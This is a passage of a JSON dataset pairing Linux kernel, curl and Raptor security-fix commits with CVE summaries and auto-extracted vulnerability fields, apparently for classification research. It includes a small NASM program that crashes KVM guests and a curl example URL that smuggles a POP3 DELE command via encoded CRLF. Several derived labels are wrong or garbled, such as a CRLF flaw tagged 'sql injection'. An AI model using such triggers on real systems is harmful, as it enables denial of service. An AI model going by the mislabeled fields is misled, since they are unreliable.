(\"aio: allocate kiocbs in batches\") iocbs are\nallocated in a batch during processing of first iocbs.  All iocbs in a\nbatch are automatically added to ctx->active_reqs list and accounted in\nctx->reqs_active.\n\nIf one (not the last one) of iocbs submitted by an user fails, further\niocbs are not processed, but they are still present in ctx->active_reqs\nand accounted in ctx->reqs_active.  This causes process to stuck in a D\nstate in wait_for_all_aios() on exit since ctx->reqs_active will never\ngo down to zero.  Furthermore since kiocb_batch_free() frees iocb\nwithout removing it from active_reqs list the list become corrupted\nwhich may cause oops.\n\nFix this by removing iocb from ctx->active_reqs and updating\nctx->reqs_active in kiocb_batch_free().\n\nSigned-off-by: Gleb Natapov <gleb@redhat.com>\nReviewed-by: Jeff Moyer <jmoyer@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@suse.de>","summary":"The kiocb_batch_free function in fs\/aio.c in the Linux kernel before 3.2.2 allows local users to cause a denial of service (OOPS) via vectors that trigger incorrect iocb management.","commit_message_1":"unused iocbs in a batch should not be accounted a active","Vulnerability Type":"Resource Management Errors","Attack Vector":"via vectors that trigger incorrect iocb management","Impact":"cause a denial of service ( oops )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"c2226fc9e87ba3da060e47333657cd6616652b84","cve_id":"CVE-2012-0045","cwe_id":null,"commit_message":"KVM: x86: fix missing checks in syscall emulation\n\nOn hosts without this patch, 32bit guests will crash (and 64bit guests\nmay behave in a wrong way) for example by simply executing following\nnasm-demo-application:\n\n    [bits 32]\n    global _start\n    SECTION .text\n    _start: syscall\n\n(I tested it with winxp and linux - both always crashed)\n\n    Disassembly of section .text:\n\n    00000000 <_start>:\n       0:   0f 05                   syscall\n\nThe reason seems a missing \"invalid opcode\"-trap (int6) for the\nsyscall opcode \"0f05\", which is not available on Intel CPUs\nwithin non-longmodes, as also on some AMD CPUs within legacy-mode.\n(depending on CPU vendor, MSR_EFER and cpuid)\n\nBecause previous mentioned OSs may not engage corresponding\nsyscall target-registers (STAR, LSTAR, CSTAR), they remain\nNULL and (non trapping) syscalls are leading to multiple\nfaults and finally crashs.\n\nDepending on the architecture (AMD or Intel) pretended by\nguests, various checks according to vendor's documentation\nare implemented to overcome the current issue and behave\nlike the CPUs physical counterparts.\n\n[mtosatti: cleanup\/beautify code]\n\nSigned-off-by: Stephan Baerwolf <stephan.baerwolf@tu-ilmenau.de>\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>","summary":"The em_syscall function in arch\/x86\/kvm\/emulate.c in the KVM implementation in the Linux kernel before 3.2.14 does not properly handle the 0f05 (aka syscall) opcode, which allows guest OS users to cause a denial of service (guest OS crash) via a crafted application, as demonstrated by an NASM file.","commit_message_1":"x86 : fix missing check in syscall emulation on host without this patch , 32bit guest will crash ( and 64bit guest may behave in a wrong way ) for example by simply executing following nasm-demo-application : [ bit <number> ] global _start section","Vulnerability Type":"aka syscall","Attack Vector":"via a crafted application , as demonstrated by an nasm file","Impact":"cause a denial of service ( guest os crash )","Root Cause":"does not properly handle the 0f05 ( aka syscall ) opcode","Attack Type":"local attacker"},{"commit_id":"a5cd335165e31db9dbab636fd29895d41da55dd2","cve_id":"CVE-2012-0044","cwe_id":"CWE-189","commit_message":"drm: integer overflow in drm_mode_dirtyfb_ioctl()\n\nThere is a potential integer overflow in drm_mode_dirtyfb_ioctl()\nif userspace passes in a large num_clips.  The call to kmalloc would\nallocate a small buffer, and the call to fb->funcs->dirty may result\nin a memory corruption.\n\nReported-by: Haogang Chen <haogangchen@gmail.com>\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nCc: stable@kernel.org\nSigned-off-by: Dave Airlie <airlied@redhat.com>","summary":"Integer overflow in the drm_mode_dirtyfb_ioctl function in drivers\/gpu\/drm\/drm_crtc.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.1.5 allows local users to gain privileges or cause a denial of service (memory corruption) via a crafted ioctl call.","commit_message_1":"integer overflow in drm_mode_dirtyfb_ioctl ( ) there is a potential integer overflow in drm_mode_dirtyfb_ioctl ( ) if userspace pass in a large num_clips","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted ioctl call","Impact":"gain privileges or cause a denial of service ( memory corruption","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"fa8b18edd752a8b4e9d1ee2cd615b82c93cf8bba","cve_id":"CVE-2012-0038","cwe_id":"CWE-189","commit_message":"xfs: validate acl count\n\nThis prevents in-memory corruption and possible panics if the on-disk\nACL is badly corrupted.\n\nSigned-off-by: Christoph Hellwig <hch@lst.de>\nSigned-off-by: Ben Myers <bpm@sgi.com>","summary":"Integer overflow in the xfs_acl_from_disk function in fs\/xfs\/xfs_acl.c in the Linux kernel before 3.1.9 allows local users to cause a denial of service (panic) via a filesystem with a malformed ACL, leading to a heap-based buffer overflow.","commit_message_1":"validate acl count this prevents in-memory corruption and possible panic if the on-disk acl is badly corrupted","Vulnerability Type":"integer overflow","Attack Vector":"via a filesystem with a malformed acl , leading to a heap - based buffer overflow","Impact":"cause a denial of service ( panic )","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"a676f235309a59d4aa78eeffd2574ae5d341fcb0","cve_id":"CVE-2012-0037","cwe_id":"CWE-200","commit_message":"CVE-2012-0037\n\nEnforce entity loading policy in raptor_libxml_resolveEntity\nand raptor_libxml_getEntity by checking for file URIs and network URIs.\n\nAdd RAPTOR_OPTION_LOAD_EXTERNAL_ENTITIES \/ loadExternalEntities for\nturning on loading of XML external entity loading, disabled by default.\n\nThis affects all the parsers that use SAX2: rdfxml, rss-tag-soup (and\naliases) and rdfa.","summary":"Redland Raptor (aka libraptor) before 2.0.7, as used by OpenOffice 3.3 and 3.4 Beta, LibreOffice before 3.4.6 and 3.5.x before 3.5.1, and other products, allows user-assisted remote attackers to read arbitrary files via a crafted XML external entity (XXE) declaration and reference in an RDF document.","commit_message_1":"<cve_id> enforce entity loading policy in raptor_libxml_resolveentity and raptor_libxml_getentity by checking for file uris and network uris","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted xml external entity ( xxe ) declaration and reference in an rdf document","Impact":"read arbitrary files","Root Cause":"caused by an error when processing XML external entities within an ODF document","Attack Type":"remote attacker"},{"commit_id":"75ca568fa1c19de4c5358fed246686de8467c238","cve_id":"CVE-2012-0036","cwe_id":"CWE-89","commit_message":"URL sanitize: reject URLs containing bad data\n\nProtocols (IMAP, POP3 and SMTP) that use the path part of a URL in a\ndecoded manner now use the new Curl_urldecode() function to reject URLs\nwith embedded control codes (anything that is or decodes to a byte value\nless than 32).\n\nURLs containing such codes could easily otherwise be used to do harm and\nallow users to do unintended actions with otherwise innocent tools and\napplications. Like for example using a URL like\npop3:\/\/pop3.example.com\/1%0d%0aDELE%201 when the app wants a URL to get\na mail and instead this would delete one.\n\nThis flaw is considered a security vulnerability: CVE-2012-0036\n\nSecurity advisory at: http:\/\/curl.haxx.se\/docs\/adv_20120124.html\n\nReported by: Dan Fandrich","summary":"curl and libcurl 7.2x before 7.24.0 do not properly consider special characters during extraction of a pathname from a URL, which allows remote attackers to conduct data-injection attacks via a crafted URL, as demonstrated by a CRLF injection attack on the (1) IMAP, (2) POP3, or (3) SMTP protocol.","commit_message_1":"reject url containing bad data protocol ( imap , pop3 and smtp ) that use the path part of a url in a decoded manner now use the new curl_urldecode ( ) function to reject url with embedded control code ( anything that is or decodes to a byte value le than <number> )","Vulnerability Type":"sql injection","Attack Vector":"via a crafted url , as demonstrated by a crlf injection attack on the ( 1 ) imap , ( 2 ) pop3 , or ( 3 ) smtp protocol","Impact":"conduct data - injection attacks","Root Cause":"do not properly consider special characters during extraction of a pathname from a url ,","Attack Type":"remote attacker"},{"commit_id":"8141c7f3e7aee618312fa1c15109e1219de784a7","cve_id":"CVE-2012-0028","cwe_id":"CWE-264","commit_message":"Move \"exit_robust_list\" into mm_release()\n\nWe don't want to get rid of the futexes just at exit() time, we want to\ndrop them when doing an execve() too, since that gets rid of the\nprevious VM image too.\n\nDoing it at mm_release() time means that we automatically always do it\nwhen we disassociate a VM map from the task.\n\nReported-by: pageexec@freemail.hu\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Nick Piggin <npiggin@suse.de>\nCc: Hugh Dickins <hugh@veritas.com>\nCc: Ingo Molnar <mingo@elte.hu>\nCc: Thomas Gleixner <tglx@linutronix.de>\nCc: Brad Spengler <spender@grsecurity.net>\nCc: Alex Efros <powerman@powerman.name>\nCc: Peter Zijlstra <a.p.zijlstra@chello.nl>\nCc: Oleg Nesterov <oleg@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The robust futex implementation in the Linux kernel before 2.6.28 does not properly handle processes that make exec system calls, which allows local users to cause a denial of service or possibly gain privileges by writing to a memory location in a child process.","commit_message_1":"move `` exit_robust_list '' into mm_release ( ) we do n't want to get rid of the futexes just at exit ( ) time , we want to drop them when doing an execve ( ) too , since that get rid of the previous vm image too","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by writing to a memory location in a child process","Impact":"cause a denial of service or possibly gain privileges","Root Cause":"does not properly handle processes that make exec system calls","Attack Type":"local attacker"},{"commit_id":"e0bccd315db0c2f919e7fcf9cb60db21d9986f52","cve_id":"CVE-2011-4914","cwe_id":"CWE-20","commit_message":"rose: Add length checks to CALL_REQUEST parsing\n\nDefine some constant offsets for CALL_REQUEST based on the description\nat <http:\/\/www.techfest.com\/networking\/wan\/x25plp.htm> and the\ndefinition of ROSE as using 10-digit (5-byte) addresses.  Use them\nconsistently.  Validate all implicit and explicit facilities lengths.\nValidate the address length byte rather than either trusting or\nassuming its value.\n\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ROSE protocol implementation in the Linux kernel before 2.6.39 does not verify that certain data-length values are consistent with the amount of data sent, which might allow remote attackers to obtain sensitive information from kernel memory or cause a denial of service (out-of-bounds read) via crafted data to a ROSE socket.","commit_message_1":"add length check to call_request parsing define some constant offset for call_request based on the description at < http : \/\/<file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted data to a rose socket","Impact":"obtain sensitive information from kernel memory or cause a denial of service ( out - of - bounds read )","Root Cause":"does not verify that certain data - length values are consistent with the amount of data sent","Attack Type":"remote attacker"},{"commit_id":"be20250c13f88375345ad99950190685eda51eb8","cve_id":"CVE-2011-4913","cwe_id":"CWE-20","commit_message":"ROSE: prevent heap corruption with bad facilities\n\nWhen parsing the FAC_NATIONAL_DIGIS facilities field, it's possible for\na remote host to provide more digipeaters than expected, resulting in\nheap corruption.  Check against ROSE_MAX_DIGIS to prevent overflows, and\nabort facilities parsing on failure.\n\nAdditionally, when parsing the FAC_CCITT_DEST_NSAP and\nFAC_CCITT_SRC_NSAP facilities fields, a remote host can provide a length\nof less than 10, resulting in an underflow in a memcpy size, causing a\nkernel panic due to massive heap corruption.  A length of greater than\n20 results in a stack overflow of the callsign array.  Abort facilities\nparsing on these invalid length values.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: stable@kernel.org\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The rose_parse_ccitt function in net\/rose\/rose_subr.c in the Linux kernel before 2.6.39 does not validate the FAC_CCITT_DEST_NSAP and FAC_CCITT_SRC_NSAP fields, which allows remote attackers to (1) cause a denial of service (integer underflow, heap memory corruption, and panic) via a small length value in data sent to a ROSE socket, or (2) conduct stack-based buffer overflow attacks via a large length value in data sent to a ROSE socket.","commit_message_1":"prevent heap corruption with bad facility when parsing the fac_national_digis facility field , it 's possible for a remote host to provide more digipeaters than expected , resulting in heap corruption","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a large length value in data sent to a rose socket","Impact":"to cause a denial of service ( integer underflow , heap memory corruption , and panic ) via a small length value in data sent to a rose socket , or  conduct stack - based buffer over","Root Cause":"does not validate the fac _ ccitt _ dest _ nsap and fac _ ccitt _ src _ nsap fields","Attack Type":"remote attacker"},{"commit_id":"f26f9aff6aaf67e9a430d16c266f91b13a5bff64","cve_id":"CVE-2011-4621","cwe_id":null,"commit_message":"Sched: fix skip_clock_update optimization\n\nidle_balance() drops\/retakes rq->lock, leaving the previous task\nvulnerable to set_tsk_need_resched().  Clear it after we return\nfrom balancing instead, and in setup_thread_stack() as well, so\nno successfully descheduled or never scheduled task has it set.\n\nNeed resched confused the skip_clock_update logic, which assumes\nthat the next call to update_rq_clock() will come nearly immediately\nafter being set.  Make the optimization robust against the waking\na sleeper before it sucessfully deschedules case by checking that\nthe current task has not been dequeued before setting the flag,\nsince it is that useless clock update we're trying to save, and\nclear unconditionally in schedule() proper instead of conditionally\nin put_prev_task().\n\nSigned-off-by: Mike Galbraith <efault@gmx.de>\nReported-by: Bjoern B. Brandenburg <bbb.lst@gmail.com>\nTested-by: Yong Zhang <yong.zhang0@gmail.com>\nSigned-off-by: Peter Zijlstra <a.p.zijlstra@chello.nl>\nCc: stable@kernel.org\nLKML-Reference: <1291802742.1417.9.camel@marge.simson.net>\nSigned-off-by: Ingo Molnar <mingo@elte.hu>","summary":"The Linux kernel before 2.6.37 does not properly implement a certain clock-update optimization, which allows local users to cause a denial of service (system hang) via an application that executes code in a loop.","commit_message_1":"fix skip_clock_update optimization idle_balance ( ) drops\/retakes rq- > lock , leaving the previous task vulnerable to set_tsk_need_resched ( )","Vulnerability Type":"system hang","Attack Vector":"via an application that executes code in a loop","Impact":"cause a denial of service ( system hang )","Root Cause":"does not properly implement a certain clock - update optimization","Attack Type":"local attacker"},{"commit_id":"0837e3242c73566fc1c0196b4ec61779c25ffc93","cve_id":"CVE-2011-4611","cwe_id":"CWE-189","commit_message":"perf, powerpc: Handle events that raise an exception without overflowing\n\nEvents on POWER7 can roll back if a speculative event doesn't\neventually complete. Unfortunately in some rare cases they will\nraise a performance monitor exception. We need to catch this to\nensure we reset the PMC. In all cases the PMC will be 256 or less\ncycles from overflow.\n\nSigned-off-by: Anton Blanchard <anton@samba.org>\nSigned-off-by: Peter Zijlstra <a.p.zijlstra@chello.nl>\nCc: <stable@kernel.org> # as far back as it applies cleanly\nLKML-Reference: <20110309143842.6c22845e@kryten>\nSigned-off-by: Ingo Molnar <mingo@elte.hu>","summary":"Integer overflow in the perf_event_interrupt function in arch\/powerpc\/kernel\/perf_event.c in the Linux kernel before 2.6.39 on powerpc platforms allows local users to cause a denial of service (unhandled performance monitor exception) via vectors that trigger certain outcomes of performance events.","commit_message_1":"handle event that raise an exception without overflowing event on power7 can roll back if a speculative event doe n't eventually complete","Vulnerability Type":"integer overflow","Attack Vector":"via vectors that trigger certain outcomes of performance events","Impact":"cause a denial of service ( unhandled performance monitor exception )","Root Cause":"caused by a performance monitor exception within PMC","Attack Type":"local attacker"},{"commit_id":"bc909d9ddbf7778371e36a651d6e4194b1cc7d4c","cve_id":"CVE-2011-4594","cwe_id":null,"commit_message":"sendmmsg\/sendmsg: fix unsafe user pointer access\n\nDereferencing a user pointer directly from kernel-space without going\nthrough the copy_from_user family of functions is a bad idea. Two of\nsuch usages can be found in the sendmsg code path called from sendmmsg,\nadded by\n\ncommit c71d8ebe7a4496fb7231151cb70a6baa0cb56f9a upstream.\ncommit 5b47b8038f183b44d2d8ff1c7d11a5c1be706b34 in the 3.0-stable tree.\n\nUsages are performed through memcmp() and memcpy() directly. Fix those\nby using the already copied msg_sys structure instead of the __user *msg\nstructure. Note that msg_sys can be set to NULL by verify_compat_iovec()\nor verify_iovec(), which requires additional NULL pointer checks.\n\nSigned-off-by: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>\nSigned-off-by: David Goulet <dgoulet@ev0ke.net>\nCC: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>\nCC: Anton Blanchard <anton@samba.org>\nCC: David S. Miller <davem@davemloft.net>\nCC: stable <stable@kernel.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The __sys_sendmsg function in net\/socket.c in the Linux kernel before 3.1 allows local users to cause a denial of service (system crash) via crafted use of the sendmmsg system call, leading to an incorrect pointer dereference.","commit_message_1":"fix unsafe user pointer access dereferencing a user pointer directly from kernel-space without going through the copy_from_user family of function is a bad idea","Vulnerability Type":"system hang","Attack Vector":"via crafted use of the sendmmsg system call , leading to an incorrect pointer dereference","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"a9cf73ea7ff78f52662c8658d93c226effbbedde","cve_id":"CVE-2011-4326","cwe_id":"CWE-399","commit_message":"ipv6: udp: fix the wrong headroom check\n\nAt this point, skb->data points to skb_transport_header.\nSo, headroom check is wrong.\n\nFor some case:bridge(UFO is on) + eth device(UFO is off),\nthere is no enough headroom for IPv6 frag head.\nBut headroom check is always false.\n\nThis will bring about data be moved to there prior to skb->head,\nwhen adding IPv6 frag header to skb.\n\nSigned-off-by: Shan Wei <shanwei@cn.fujitsu.com>\nAcked-by: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The udp6_ufo_fragment function in net\/ipv6\/udp.c in the Linux kernel before 2.6.39, when a certain UDP Fragmentation Offload (UFO) configuration is enabled, allows remote attackers to cause a denial of service (system crash) by sending fragmented IPv6 UDP packets to a bridge device.","commit_message_1":"udp : fix the wrong headroom check at this point , skb- > data point to skb_transport_header","Vulnerability Type":"Resource Management Errors","Attack Vector":"by sending fragmented ipv6 udp packets to a bridge device","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by an error related to a headroom check within the udp6_ufo_fragment() function","Attack Type":"remote attacker"},{"commit_id":"dc0b027dfadfcb8a5504f7d8052754bf8d501ab9","cve_id":"CVE-2011-4324","cwe_id":null,"commit_message":"NFSv4: Convert the open and close ops to use fmode\n\nSigned-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>","summary":"The encode_share_access function in fs\/nfs\/nfs4xdr.c in the Linux kernel before 2.6.29 allows local users to cause a denial of service (BUG and system crash) by using the mknod system call with a pathname on an NFSv4 filesystem.","commit_message_1":"convert the open and close ops to use fmode","Vulnerability Type":"BUG and system crash","Attack Vector":"by using the mknod system call with a pathname on an nfsv4 filesystem","Impact":"cause a denial of service ( bug and system crash )","Root Cause":"The encode_share_access function","Attack Type":"local attacker"},{"commit_id":"bf118a342f10dafe44b14451a1392c3254629a1f","cve_id":"CVE-2011-4131","cwe_id":"CWE-189","commit_message":"NFSv4: include bitmap in nfsv4 get acl data\n\nThe NFSv4 bitmap size is unbounded: a server can return an arbitrary\nsized bitmap in an FATTR4_WORD0_ACL request.  Replace using the\nnfs4_fattr_bitmap_maxsz as a guess to the maximum bitmask returned by a server\nwith the inclusion of the bitmap (xdr length plus bitmasks) and the acl data\nxdr length to the (cached) acl page data.\n\nThis is a general solution to commit e5012d1f \"NFSv4.1: update\nnfs4_fattr_bitmap_maxsz\" and fixes hitting a BUG_ON in xdr_shrink_bufhead\nwhen getting ACLs.\n\nFix a bug in decode_getacl that returned -EINVAL on ACLs > page when getxattr\nwas called with a NULL buffer, preventing ACL > PAGE_SIZE from being retrieved.\n\nCc: stable@kernel.org\nSigned-off-by: Andy Adamson <andros@netapp.com>\nSigned-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>","summary":"The NFSv4 implementation in the Linux kernel before 3.2.2 does not properly handle bitmap sizes in GETACL replies, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words.","commit_message_1":"include bitmap in nfsv4 get acl data the nfsv4 bitmap size is unbounded : a server can return an arbitrary sized bitmap in an fattr4_word0_acl request","Vulnerability Type":"Numeric Errors","Attack Vector":"by sending an excessive number of bitmap words","Impact":"cause a denial of service ( oops )","Root Cause":"does not properly handle bitmap sizes","Attack Type":"remote attacker"},{"commit_id":"ec8013beddd717d1740cfefb1a9b900deef85462","cve_id":"CVE-2011-4127","cwe_id":"CWE-264","commit_message":"dm: do not forward ioctls from logical volumes to the underlying device\n\nA logical volume can map to just part of underlying physical volume.\nIn this case, it must be treated like a partition.\n\nBased on a patch from Alasdair G Kergon.\n\nCc: Alasdair G Kergon <agk@redhat.com>\nCc: dm-devel@redhat.com\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The Linux kernel before 3.2.2 does not properly restrict SG_IO ioctl calls, which allows local users to bypass intended restrictions on disk read and write operations by sending a SCSI command to (1) a partition block device or (2) an LVM volume.","commit_message_1":"do not forward ioctls from logical volume to the underlying device a logical volume can map to just part of underlying physical volume","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by sending a scsi command to ( 1 ) a partition block device or ( 2 ) an lvm volume","Impact":"bypass intended restrictions on disk read and write operations","Root Cause":"does not properly restrict sg _ io ioctl calls","Attack Type":"local attacker"},{"commit_id":"550fd08c2cebad61c548def135f67aba284c6162","cve_id":"CVE-2011-4112","cwe_id":"CWE-264","commit_message":"net: Audit drivers to identify those needing IFF_TX_SKB_SHARING cleared\n\nAfter the last patch, We are left in a state in which only drivers calling\nether_setup have IFF_TX_SKB_SHARING set (we assume that drivers touching real\nhardware call ether_setup for their net_devices and don't hold any state in\ntheir skbs.  There are a handful of drivers that violate this assumption of\ncourse, and need to be fixed up.  This patch identifies those drivers, and marks\nthem as not being able to support the safe transmission of skbs by clearning the\nIFF_TX_SKB_SHARING flag in priv_flags\n\nSigned-off-by: Neil Horman <nhorman@tuxdriver.com>\nCC: Karsten Keil <isdn@linux-pingi.de>\nCC: \"David S. Miller\" <davem@davemloft.net>\nCC: Jay Vosburgh <fubar@us.ibm.com>\nCC: Andy Gospodarek <andy@greyhouse.net>\nCC: Patrick McHardy <kaber@trash.net>\nCC: Krzysztof Halasa <khc@pm.waw.pl>\nCC: \"John W. Linville\" <linville@tuxdriver.com>\nCC: Greg Kroah-Hartman <gregkh@suse.de>\nCC: Marcel Holtmann <marcel@holtmann.org>\nCC: Johannes Berg <johannes@sipsolutions.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The net subsystem in the Linux kernel before 3.1 does not properly restrict use of the IFF_TX_SKB_SHARING flag, which allows local users to cause a denial of service (panic) by leveraging the CAP_NET_ADMIN capability to access \/proc\/net\/pktgen\/pgctrl, and then using the pktgen package in conjunction with a bridge device for a VLAN interface.","commit_message_1":"audit driver to identify those needing iff_tx_skb_sharing cleared after the last patch , we are left in a state in which only driver calling ether_setup have iff_tx_skb_sharing set ( we assume that driver touching real hardware call ether_setup for their net_devices and do n't hold any state in their skbs","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging the cap _ net _ admin capability to access \/ proc \/ net \/ pktgen \/ pgctrl , and then using the pktgen package in conjunction with a bridge device for a vlan interface","Impact":"cause a denial of service ( panic )","Root Cause":"does not properly restrict use of the iff _ tx _ skb _ sharing flag","Attack Type":"local attacker"},{"commit_id":"15291164b22a357cb211b618adfef4fa82fc0de3","cve_id":"CVE-2011-4086","cwe_id":"CWE-119","commit_message":"jbd2: clear BH_Delay & BH_Unwritten in journal_unmap_buffer\n\njournal_unmap_buffer()'s zap_buffer: code clears a lot of buffer head\nstate ala discard_buffer(), but does not touch _Delay or _Unwritten as\ndiscard_buffer() does.\n\nThis can be problematic in some areas of the ext4 code which assume\nthat if they have found a buffer marked unwritten or delay, then it's\na live one.  Perhaps those spots should check whether it is mapped\nas well, but if jbd2 is going to tear down a buffer, let's really\ntear it down completely.\n\nWithout this I get some fsx failures on sub-page-block filesystems\nup until v3.2, at which point 4e96b2dbbf1d7e81f22047a50f862555a6cb87cb\nand 189e868fa8fdca702eb9db9d8afc46b5cb9144c9 make the failures go\naway, because buried within that large change is some more flag\nclearing.  I still think it's worth doing in jbd2, since\n->invalidatepage leads here directly, and it's the right place\nto clear away these flags.\n\nSigned-off-by: Eric Sandeen <sandeen@redhat.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: stable@vger.kernel.org","summary":"The journal_unmap_buffer function in fs\/jbd2\/transaction.c in the Linux kernel before 3.3.1 does not properly handle the _Delay and _Unwritten buffer head states, which allows local users to cause a denial of service (system crash) by leveraging the presence of an ext4 filesystem that was mounted with a journal.","commit_message_1":"clear bh_delay & bh_unwritten in journal_unmap_buffer journal_unmap_buffer ( ) 's zap_buffer : code clear a lot of buffer head state ala discard_buffer ( ) , but doe not touch _delay or _unwritten a discard_buffer ( ) doe","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging the presence of an ext4 filesystem that was mounted with a journal","Impact":"cause a denial of service ( system crash )","Root Cause":"does not properly handle the _ delay and _ unwritten buffer head states","Attack Type":"local attacker"},{"commit_id":"7ed47b7d142ec99ad6880bbbec51e9f12b3af74c","cve_id":"CVE-2011-4081","cwe_id":null,"commit_message":"crypto: ghash - Avoid null pointer dereference if no key is set\n\nThe ghash_update function passes a pointer to gf128mul_4k_lle which will\nbe NULL if ghash_setkey is not called or if the most recent call to\nghash_setkey failed to allocate memory.  This causes an oops.  Fix this\nup by returning an error code in the null case.\n\nThis is trivially triggered from unprivileged userspace through the\nAF_ALG interface by simply writing to the socket without setting a key.\n\nThe ghash_final function has a similar issue, but triggering it requires\na memory allocation failure in ghash_setkey _after_ at least one\nsuccessful call to ghash_update.\n\n  BUG: unable to handle kernel NULL pointer dereference at 00000670\n  IP: [<d88c92d4>] gf128mul_4k_lle+0x23\/0x60 [gf128mul]\n  *pde = 00000000\n  Oops: 0000 [#1] PREEMPT SMP\n  Modules linked in: ghash_generic gf128mul algif_hash af_alg nfs lockd nfs_acl sunrpc bridge ipv6 stp llc\n\n  Pid: 1502, comm: hashatron Tainted: G        W   3.1.0-rc9-00085-ge9308cf #32 Bochs Bochs\n  EIP: 0060:[<d88c92d4>] EFLAGS: 00000202 CPU: 0\n  EIP is at gf128mul_4k_lle+0x23\/0x60 [gf128mul]\n  EAX: d69db1f0 EBX: d6b8ddac ECX: 00000004 EDX: 00000000\n  ESI: 00000670 EDI: d6b8ddac EBP: d6b8ddc8 ESP: d6b8dda4\n   DS: 007b ES: 007b FS: 00d8 GS: 0033 SS: 0068\n  Process hashatron (pid: 1502, ti=d6b8c000 task=d6810000 task.ti=d6b8c000)\n  Stack:\n   00000000 d69db1f0 00000163 00000000 d6b8ddc8 c101a520 d69db1f0 d52aa000\n   00000ff0 d6b8dde8 d88d310f d6b8a3f8 d52aa000 00001000 d88d502c d6b8ddfc\n   00001000 d6b8ddf4 c11676ed d69db1e8 d6b8de24 c11679ad d52aa000 00000000\n  Call Trace:\n   [<c101a520>] ? kmap_atomic_prot+0x37\/0xa6\n   [<d88d310f>] ghash_update+0x85\/0xbe [ghash_generic]\n   [<c11676ed>] crypto_shash_update+0x18\/0x1b\n   [<c11679ad>] shash_ahash_update+0x22\/0x36\n   [<c11679cc>] shash_async_update+0xb\/0xd\n   [<d88ce0ba>] hash_sendpage+0xba\/0xf2 [algif_hash]\n   [<c121b24c>] kernel_sendpage+0x39\/0x4e\n   [<d88ce000>] ? 0xd88cdfff\n   [<c121b298>] sock_sendpage+0x37\/0x3e\n   [<c121b261>] ? kernel_sendpage+0x4e\/0x4e\n   [<c10b4dbc>] pipe_to_sendpage+0x56\/0x61\n   [<c10b4e1f>] splice_from_pipe_feed+0x58\/0xcd\n   [<c10b4d66>] ? splice_from_pipe_begin+0x10\/0x10\n   [<c10b51f5>] __splice_from_pipe+0x36\/0x55\n   [<c10b4d66>] ? splice_from_pipe_begin+0x10\/0x10\n   [<c10b6383>] splice_from_pipe+0x51\/0x64\n   [<c10b63c2>] ? default_file_splice_write+0x2c\/0x2c\n   [<c10b63d5>] generic_splice_sendpage+0x13\/0x15\n   [<c10b4d66>] ? splice_from_pipe_begin+0x10\/0x10\n   [<c10b527f>] do_splice_from+0x5d\/0x67\n   [<c10b6865>] sys_splice+0x2bf\/0x363\n   [<c129373b>] ? sysenter_exit+0xf\/0x16\n   [<c104dc1e>] ? trace_hardirqs_on_caller+0x10e\/0x13f\n   [<c129370c>] sysenter_do_call+0x12\/0x32\n  Code: 83 c4 0c 5b 5e 5f c9 c3 55 b9 04 00 00 00 89 e5 57 8d 7d e4 56 53 8d 5d e4 83 ec 18 89 45 e0 89 55 dc 0f b6 70 0f c1 e6 04 01 d6 <f3> a5 be 0f 00 00 00 4e 89 d8 e8 48 ff ff ff 8b 45 e0 89 da 0f\n  EIP: [<d88c92d4>] gf128mul_4k_lle+0x23\/0x60 [gf128mul] SS:ESP 0068:d6b8dda4\n  CR2: 0000000000000670\n  ---[ end trace 4eaa2a86a8e2da24 ]---\n  note: hashatron[1502] exited with preempt_count 1\n  BUG: scheduling while atomic: hashatron\/1502\/0x10000002\n  INFO: lockdep is turned off.\n  [...]\n\nSigned-off-by: Nick Bowler <nbowler@elliptictech.com>\nCc: stable@kernel.org [2.6.37+]\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"crypto\/ghash-generic.c in the Linux kernel before 3.1 allows local users to cause a denial of service (NULL pointer dereference and OOPS) or possibly have unspecified other impact by triggering a failed or missing ghash_setkey function call, followed by a (1) ghash_update function call or (2) ghash_final function call, as demonstrated by a write operation on an AF_ALG socket.","commit_message_1":"ghash - avoid null pointer dereference if no key is set the ghash_update function pass a pointer to gf128mul_4k_lle which will be null if ghash_setkey is not called or if the most recent call to ghash_setkey failed to allocate memory","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by triggering a failed or missing ghash _ setkey function call , followed by a ( 1 ) ghash _ update function call or ( 2 ) ghash _ final function call , as demonstrated by a write operation on an af _ alg socket","Impact":"cause a denial of service ( pointer dereference and oops ) or possibly have unspecified other impact","Root 